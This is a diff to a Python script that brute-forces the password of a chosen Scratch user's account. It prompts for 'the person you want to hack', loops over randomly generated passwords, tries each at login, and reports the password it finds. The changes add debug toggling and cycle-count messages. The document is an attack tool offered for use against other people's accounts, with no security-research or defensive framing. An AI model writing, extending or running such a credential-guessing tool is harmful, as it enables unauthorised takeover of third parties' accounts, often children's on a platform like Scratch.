@@ -29,9 +29,19 @@ while loop == True:
   else:
     loop = True
 
-debug = False
-mdebug = False
-
+loop = True
+while loop == True:
+  ic = input('Debug? (Y/n) ')
+  if ic == 'n':
+    debug = False
+    loop = False
+  elif ic == 'Y':
+    os.system('clear')
+    debug = True
+    loop = False
+  else:
+    loop = True
+os.system('clear')
 # ask for the username
 susername = input('What is the scratch username of the person you want to hack? ')
 os.system('clear')
@@ -58,9 +68,6 @@ while on:
   # generate a random password
   for i in range(0, random.randint(8, 25)):
     tpass.append(random.choice(alpb))
-    if mdebug == True:
-      print(f'Password gen at character {numc.num}.{numc.mnum} Done with value {tpass[i]}')
-      numc.mnum += 1
   tpass = "".join(str(x) for x in tpass)
   # try to login with the generated password
   try:
@@ -73,8 +80,29 @@ while on:
     on = True
   if debug == True:   
     print(f'Cycle number {numc.num} Done with password {tpass}')
-    numc.mnum = 1
-    numc.num += 1
+  numc.num += 1
+  num = numc.num
+  if debug == False:
+    if num == 1:
+      print(f'{num} cycles done.')
+    if num == 10:
+      print(f'{num} cycles done.')
+    if num == 100:
+      print(f'{num} cycles done.')
+    if num == 1000:
+      print(f'{num} cycles done.')
+    if num == 10000:
+      print(f'{num} cycles done.')
+    if num == 100000:
+      print(f'{num} cycles done.')
+    if num == 1000000:
+      print(f'{num} cycles done.')
+    if num == 10000000:
+      print(f'{num} cycles done.')
+    if num == 100000000:
+      print(f'{num} cycles done.')
+    if num == 1000000000:
+      print(f'I\'m literally just not gonna count')
 # when the loop is done AKA when the password is correct, display it to the user
 print('\n\nBrute-force is done.')
 print(f'The password is {rpassc.rpass}')
